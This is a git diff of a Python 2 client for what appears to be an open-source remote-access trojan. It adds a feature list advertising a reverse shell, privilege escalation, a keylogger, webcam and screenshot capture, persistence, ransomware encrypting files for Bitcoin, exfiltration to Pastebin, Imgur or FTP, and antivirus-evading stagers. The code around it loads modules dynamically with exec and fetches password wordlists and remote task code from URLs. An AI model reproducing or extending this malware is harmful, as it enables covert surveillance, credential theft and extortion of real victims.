@@ -23,75 +23,42 @@
 
 '''
 
-,adPPYYba, 8b,dPPYba,   ,adPPYb,d8 88,dPPYba,  aa       aa
-""     `Y8 88P'   `"8a a8"    `Y88 88P'   `"8a 88       88
-,adPPPPP88 88       88 8b       88 88	       8b	88
-88,    ,88 88       88 "8a,   ,d88 88	       "8a,   ,d88
-`"8bbdP"Y8 88       88  `"YbbdP"Y8 88           `"YbbdP"Y8
-                        aa,    ,88 	        aa,    ,88
-                         "Y8bbdP"          	 "Y8bbdP'
-
-                                               88                          ,d
-                                               88                          88
- ,adPPYba,  ,adPPYb,d8  ,adPPYb,d8 8b,dPPYba,  88 ,adPPYYba, 8b,dPPYba,    88
-a8P     88 a8"    `Y88 a8"    `Y88 88P'    "8a 88 ""     `Y8 88P'   `"8a MM88MMM
-8PP""""""" 8b       88 8b       88 88       d8 88 ,adPPPPP88 88       88   88
-"8b,   ,aa "8a,   ,d88 "8a,   ,d88 88b,   ,a8" 88 88,    ,88 88       88   88
- `"Ybbd8"'  `"YbbdP"Y8  `"YbbdP"Y8 88`YbbdP"'  88 `"8bbdP"Y8 88       88   88,
-            aa,    ,88  aa,    ,88 88                                      "Y888
-             "Y8bbdP"    "Y8bbdP"  88
-
-
-
+>  30+ modules - interactive & automated
+    - Reverse Shell   remotely access host machine with a shell
+    - Root Acess      obtain administrator privileges
+    - Keylogger       log user keystrokes with the window they were entered in
+    - Webcam          capture image/video or stream live
+    - Screenshot      snap shots of the host desktop
+    - Persistence     maintain access with 8 different persistence methods
+    - Packetsniffer   monitor host network traffic for valuable information
+    - Portscanner     explore the local network for more hosts, open ports, vulnerabilities
+    - Ransom          encrypt host files and ransom them to the user for Bitcoin
+    - Upload          automatically upload results to Imgur, Pastebin, or a remote FTP server
+    - Email           Outlook email of a logged in user can be accessed without authentication
+    - SMS             Send & receive SMS text messages with user's contacts
+    
+>  Portability - supports all major platforms & architectures
+    - automated payload configuration
+    - zero dependencies whatsoever (not even Python is required)
+    - dynamically compiles unique stagers as native executables to avoid anti-virus detection
+    - no downloads, no installations, no configuration, no dependencies
+    
+>  Security - encrypted communication, anti-forensics, 
+    - all communication is encrypted - between clients and server& between  server and database
+    - AES cipher in OCB mode - secure data confidentiality, integrity, and authenticity
+    - 256 bit session keys - generated via Diffie-Hellman Internet Key Exchange (IKE) - RFC 2631
+    
 '''
 
+__verbose__ = True
 
 
-for pkg in '''
-import os
-import sys
-import mss
-import cv2
-import wmi
-import time
-import json
-import zlib
-import uuid
-import numpy
-import Queue
-import base64
-import ctypes
-import pickle
-import struct
-import socket
-import random
-import ftplib
-import urllib
-import twilio
-import pyHook
-import pyxhook
-import hashlib
-import urllib2
-import marshal
-import zipfile
-import _winreg
-import win32com
-import pythoncom
-import functools
-import threading
-import cStringIO
-import subprocess
-import collections
-import Crypto.Util
-import Crypto.Cipher.AES
-import Crypto.PublicKey.RSA
-import Crypto.Cipher.PKCS1_OAEP
-'''.splitlines():
+for pkg in ['os', 'sys', 'mss', 'cv2', 'wmi', 'time', 'json', 'zlib', 'uuid', 'numpy', 'Queue', 'base64', 'ctypes', 'pickle', 'struct', 'socket', 'random', 'ftplib', 'urllib', 'twilio', 'pyHook', 'pyxhook', 'hashlib', 'urllib2', 'marshal', 'zipfile', '_winreg', 'win32com', 'pythoncom', 'functools', 'threading', 'cStringIO', 'subprocess', 'collections', 'Crypto.Util', 'Crypto.Cipher.AES', 'Crypto.PublicKey.RSA', 'Crypto.Cipher.PKCS1_OAEP']:
     try:
-        exec pkg in globals()
-    except ImportError:
-        pass
-
+        exec 'import {}'.format(pkg) in globals()
+    except ImportError as error:
+        if __verbose__:
+            print("Import error: {}".format(str(error)))
 
 
 def config(*arg, **options):
@@ -401,7 +368,7 @@ class Payload():
             wordlist_filenames = urllib.urlopen('https://raw.githubusercontent.com/digination/dirbuster-ng/master/wordlists/common.txt').read().splitlines()
             wordlist_passwords = urllib.urlopen('https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt').read().splitlines()
             config['resources']['wordlists'] = {'filenames': wordlist_filenames, 'passwords': wordlist_passwords}
-            self._debug = True if bool('--debug' in sys.argv or 'debug' in sys.argv) else False
+            self._debug = True if bool('--debug' in sys.argv or globals().get('__verbose__')) else False
             if 'v' in kwargs:
                 v = kwargs.get('v')
                 tasks = urllib.urlopen(v).read()
